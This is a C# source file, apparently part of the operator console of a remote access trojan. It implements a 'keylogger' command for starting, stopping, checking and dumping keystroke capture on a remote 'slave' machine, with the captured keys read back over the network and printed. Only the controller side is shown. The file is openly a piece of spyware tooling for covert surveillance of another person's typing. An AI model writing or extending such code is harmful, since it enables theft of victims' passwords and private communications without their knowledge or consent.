using Master.AdvancedConsole;
using Master.Commands.Core;
using System;
using System.Collections.Generic;

namespace Master.Commands
{
    internal class KeyLogger : IMasterCommand
    {
        public string name { get; } = "keylogger";

        public string description { get; } = "Capture the slave's keystokes. You can see it's status, dump logged keys, start and stop it";

        public bool isLocal { get; } = false;

        public List<string> validArguments { get; } = new List<string>()
        {
            "start",
            "stop",
            "dump",
            "status"
        };

        public void Process(List<string> args)
        {
            var result = MasterCommandsManager.networkManager.ReadLine();

            if (args[0] == "dump")
            {
                if (result != "") Console.WriteLine(result);
            }
            else
            {
                Console.Write("Keylogger status : [");
                if (result == "on")
                    ColorTools.WriteInlineMessage("ON", ConsoleColor.Cyan);
                else
                    ColorTools.WriteInlineMessage("OFF", ConsoleColor.Red);
                Console.WriteLine("]");
            }
        }
    }
}
